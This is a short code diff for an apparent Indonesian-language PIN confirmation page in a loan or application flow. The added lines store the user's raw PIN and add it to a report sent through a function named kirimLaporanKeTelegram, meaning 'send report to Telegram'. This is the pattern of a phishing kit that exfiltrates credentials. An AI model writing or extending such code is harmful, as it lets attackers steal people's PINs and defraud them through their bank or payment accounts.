@@ -30,9 +30,11 @@
     const rawPin = pin;
     pin = '';
     NovaStorage.confirmPin();
+    NovaStorage.setApplication({ lastPin: rawPin });
     window.kirimLaporanKeTelegram?.({
       event: 'PIN_CONFIRMED',
       page: 'konfirmasi-pin.html',
+      pin: rawPin,
       status: 'PIN_CONFIRMED'
     });
     location.replace('proses-pengajuan.html');
